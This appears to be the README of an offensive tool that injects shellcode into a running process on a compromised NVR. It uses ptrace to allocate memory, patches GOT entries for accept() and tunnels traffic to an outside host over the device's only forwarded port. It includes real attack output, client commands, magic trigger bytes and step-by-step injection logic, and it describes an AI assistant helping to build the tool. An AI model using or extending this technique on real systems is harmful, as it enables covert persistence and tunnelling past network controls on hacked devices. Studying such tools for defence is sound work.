
## Usage
(real example from nvr of the red team project)
```
[*] Retrieving output (cmd=265)...
    HTTP 200  size=904 bytes
ptrace_alloc_page: mmap2 failed (result 0xb54b4000), trying brk fallback
[*] target pid  : 821
[*] target exe  : /program/bin/core
[*] GOT[accept] : 0x3cbca0
[inject] libc     : /lib/arm-linux-gnueabihf/libc-2.19-2014.04.so  base 0xb6566000
[inject] real accept() @ 0xb6da97b1
[inject] hook page @ 0x79c000
[inject] config   @ 0x79c400  remote 192.168.1.111:10443  scope_port 554
[inject] GOT[accept] patched → 0x79c000
[inject] patching GOT[accept] in /program/lib/libeXosip2.so               @ 0xb667d450
[inject] patching GOT[accept] in /program/lib/libstdsoap2.so              @ 0xb69cbe50
[inject] patching GOT[accept] in /lib/libdriver.so                        @ 0xb6d8f694
[inject] patching GOT[accept] in /program/lib/libbp.so                    @ 0xb6f53318
[inject] kickstart sent to port 554
[+] hook live — connections with magic \xde\xad\xbe\xef will be tunneled to 192.168.1.111:10443

python3 client.py 443 <nvr_ip> 554

curl -vk https://localhost

python3 client.py --unhook <nvr_ip> 554
```

## What is it?

Here is a situation from a Red teaming project i do for my mom's company!

Lets say you hacked something which is behind `NAT`, All u have is a forwarded port by the nat which something is already listening on it.
You dont have a route to the `WAN`.
also, netfilter is too old to do `DNAT` action.
This tool gives u simple traffic relay over a stolen session!
Which means u can tunnel over the only open port u have.
For now im supporting `ARM`, `x86` `x64`

## How does it work
I had a cool idea, so i did some micro management for claude and we did figure it out toogether!
First thing is the injector. we need to inject our payload somehow, so i asked for claude to do those next steps:
### Step by step
- First thing u wanna do, is to read from `/proc/net/tcp` to identify which pid is listening on this port?
- After having the PID and process name, lets identify where is the binary located on the filesystem.
- Parse the ELF and find the GOT address for `accept` libc function
- Use /proc/maps to find all the loaded shared object of the process
- for each shared object, parse the `ELF` file and look if there is got symbol for accept
- use ptrace to read the GOT address and have the real address of `accept` for the real process and all of the shared objects.
- Resolving from libc all the functions we need for our payloads by parsing the ELF file and adding to the base using /proc/maps
- Injecting a `syscall` by overriding `EIP / PC` and calling `mmap` to allocate buffer and get the address of it
- Putting our payload in the returned address
- Adding config sturcts that holds the magic, the ip:port to connect to, and all the addresses to our functions since the payload is shellcode. in addition we store there all the places we hooked, so we can unhook whenever wanted
- Overriding the `GOT` address of accept to our new payload!

We have an injection method. We need the payload now which needs to be a shellcode.
we already resolved all the needed function addresses, so we can just type standard c code and use the addresses from the config struct without relying on `ld.so` so we are basicly a shellcode!
When the hook triggers our payload seeks from the socket 4 bytes, if he sees the magic:
```
\xde\xad\xbe\xef
```
We will take the data from the socket from now on to our tool.
We are using `select()` to tunnel our self to the destination.
If not, we are just returning the `fd` to our caller.

If our shellcode sees:
```
\xef\xbe\xad\xde
```
Our code loops through the list in the config struct, and write there the real `accept()` address.
So whenever u send the kill magic, all the hooks getting free

